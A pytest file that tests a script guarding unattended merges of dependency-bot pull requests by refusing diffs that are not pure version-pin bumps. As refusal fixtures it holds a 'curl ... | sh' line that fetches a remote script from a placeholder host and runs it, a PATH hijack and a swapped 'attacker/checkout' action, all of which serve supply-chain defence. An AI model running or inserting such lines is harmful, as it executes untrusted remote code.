"""Tests for scripts/assert-pin-only-diff.py.

This is the check that stands between a dependency bot's pull request and an
unattended merge, so what it refuses matters as much as what it accepts. The
refusal cases below are the ones that would otherwise turn "approve because the
author is renovate[bot] or dependabot[bot]" into write access to main.

No containers and no stack state, so these run anywhere:
    pytest -m scripts tests/test_assert_pin_only_diff.py
"""

import subprocess

import pytest
from conftest import REPO_ROOT

pytestmark = pytest.mark.scripts

SCRIPT = REPO_ROOT / "scripts" / "assert-pin-only-diff.py"

# A 40 character hex string, the shape of a GitHub Actions commit pin.
SHA = "a" * 40
OTHER_SHA = "b" * 40


def _check(diff: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["python3", str(SCRIPT)],
        input=diff,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )


def _diff(path: str, body: str, *, header: str = "") -> str:
    return (
        f"diff --git a/{path} b/{path}\n"
        f"{header}"
        f"--- a/{path}\n"
        f"+++ b/{path}\n"
        "@@ -1,3 +1,3 @@\n"
        f"{body}"
    )


# ---------------------------------------------------------------------------
# Accepted: a version moved, and nothing else did
# ---------------------------------------------------------------------------


def test_accepts_a_github_action_sha_bump():
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            f"-        uses: actions/checkout@{SHA} # v7\n"
            f"+        uses: actions/checkout@{OTHER_SHA} # v7\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_pre_commit_hook_rev_bump():
    result = _check(
        _diff(
            ".pre-commit-config.yaml",
            "-    rev: v2.2.2\n+    rev: v2.2.3\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_a_tool_versions_bump():
    result = _check(
        _diff(
            ".tool-versions",
            "-pre-commit 4.6.2\n+pre-commit 4.7.0\n",
        )
    )
    assert result.returncode == 0, result.stdout


def test_accepts_the_renovate_annotated_alpine_line():
    # ALPINE_VERSION is the one line in .env.example a renovate: comment
    # anchors, and it is the only variable this script reads live off
    # .env.example as eligible for a version bump.
    result = _check(
        _diff(
            ".env.example",
            '-ALPINE_VERSION="3.24"\n+ALPINE_VERSION="3.25"\n',
        )
    )
    assert result.returncode == 0, result.stdout


# ---------------------------------------------------------------------------
# Refused: a real pin surface, but not one this repository's bots manage
# ---------------------------------------------------------------------------


def test_refuses_gocryptfs_version_despite_looking_like_a_pin():
    # CLAUDE.md and .env.example's own comment say this one is bumped by
    # hand: it is an apk version constraint, not a Docker tag, and no
    # renovate: annotation sits above it. A script that normalized any
    # `*_VERSION="..."` line would wave this through.
    result = _check(
        _diff(
            ".env.example",
            '-GOCRYPTFS_VERSION="2.6"\n+GOCRYPTFS_VERSION="2.7"\n',
        )
    )
    assert result.returncode == 1, result.stdout


def test_refuses_docker_image_tag_version_despite_looking_like_a_pin():
    # DOCKER_IMAGE_TAG_VERSION is a local build tag with no upstream to track
    # and no renovate: annotation above it either.
    result = _check(
        _diff(
            ".env.example",
            '-DOCKER_IMAGE_TAG_VERSION="1.0.0"\n+DOCKER_IMAGE_TAG_VERSION="1.0.1"\n',
        )
    )
    assert result.returncode == 1, result.stdout


def test_refuses_a_pip_pin_in_tests_requirements():
    # Neither bot manages this file: dependabot.yml enables only the
    # github-actions and pre-commit ecosystems, so a change here from a bot
    # would not be a real shape and is not on the allowlist.
    result = _check(
        _diff(
            "tests/requirements.txt",
            "-pytest>=9.1.1\n+pytest>=9.2.0\n",
        )
    )
    assert result.returncode == 1, result.stdout
    assert "not a dependency pin file" in result.stdout


# ---------------------------------------------------------------------------
# Refused: anything else, including alongside a legitimate bump
# ---------------------------------------------------------------------------


def test_refuses_a_line_smuggled_in_beside_a_real_bump():
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            f"-        uses: actions/checkout@{SHA} # v7\n"
            f"+        uses: actions/checkout@{OTHER_SHA} # v7\n"
            "+          curl -s https://example.invalid/x.sh | sh\n",
        )
    )
    assert result.returncode == 1
    assert "was not a version bump" in result.stdout


def test_refuses_a_swapped_name_at_the_same_version():
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            f"-        uses: actions/checkout@{SHA}\n"
            f"+        uses: attacker/checkout@{SHA}\n",
        )
    )
    assert result.returncode == 1


def test_refuses_a_file_outside_the_pin_paths():
    result = _check(
        _diff(
            "Dockerfile",
            "-ARG ALPINE_VERSION\n+ARG ALPINE_VERSION_2\n",
        )
    )
    assert result.returncode == 1
    assert "not a dependency pin file" in result.stdout


def test_refuses_a_new_file_even_in_an_allowed_path():
    result = _check(
        _diff(
            ".github/workflows/extra.yml",
            "+name: extra\n",
            header="new file mode 100644\n",
        )
    )
    assert result.returncode == 1
    assert "new file mode" in result.stdout


def test_refuses_a_rename():
    result = _check(
        "diff --git a/.tool-versions b/.tool-versions-old\n"
        "--- a/.tool-versions\n"
        "+++ b/.tool-versions-old\n"
    )
    assert result.returncode == 1
    assert "renamed to" in result.stdout


def test_refuses_an_empty_diff():
    # A pull request whose diff cannot be read must not read as "nothing wrong
    # with it", which is what an empty allowlist check would have concluded.
    result = _check("")
    assert result.returncode == 1
    assert "empty" in result.stdout


# ---------------------------------------------------------------------------
# Fails closed: the ways an unreadable diff could have passed for a clean one
# ---------------------------------------------------------------------------


def test_refuses_output_with_no_file_header():
    # Truncated or binary output parses into no files at all. Reporting that
    # as "nothing to object to" would approve a diff nobody managed to read.
    result = _check("Binary files a/x.png and b/x.png differ\n")
    assert result.returncode == 1
    assert "no file headers" in result.stdout


def test_refuses_a_file_whose_lines_could_not_be_read():
    result = _check(
        "diff --git a/.env.example b/.env.example\nindex 1111111..2222222 100644\n"
    )
    assert result.returncode == 1
    assert "no readable changed lines" in result.stdout


def test_counts_an_added_line_that_looks_like_a_file_header():
    # `+++x` inside a hunk is an added line reading `++x`. Skipping it as a
    # ---/+++ header would drop it from the comparison, so the smuggled line
    # would never be seen.
    result = _check(
        _diff(
            ".tool-versions",
            "-pre-commit 4.6.2\n+pre-commit 4.7.0\n+++PATH=/tmp/evil\n",
        )
    )
    assert result.returncode == 1
    assert "was not a version bump" in result.stdout


# ---------------------------------------------------------------------------
# Only a number in a pin position counts as a version, and only on the one
# annotated .env.example line this script is allowed to touch at all
# ---------------------------------------------------------------------------


def test_refuses_a_numeric_change_on_an_unannotated_env_line():
    # PARANOID_MODE has no renovate: annotation above it, and is not a
    # version at all; a rule keyed only on "some characters changed inside
    # quotes" would have accepted this.
    result = _check(
        _diff(".env.example", "-PARANOID_MODE=false\n+PARANOID_MODE=true\n")
    )
    assert result.returncode == 1


def test_refuses_a_changed_yaml_number():
    result = _check(
        _diff(
            ".github/workflows/pull-request-validation.yml",
            "-    timeout-minutes: 8\n+    timeout-minutes: 600\n",
        )
    )
    assert result.returncode == 1


def test_refuses_a_prefix_that_changes_shape():
    result = _check(
        _diff(
            ".pre-commit-config.yaml",
            "-    rev: v2.2.2\n+    rev v2.2.2\n",
        )
    )
    assert result.returncode == 1
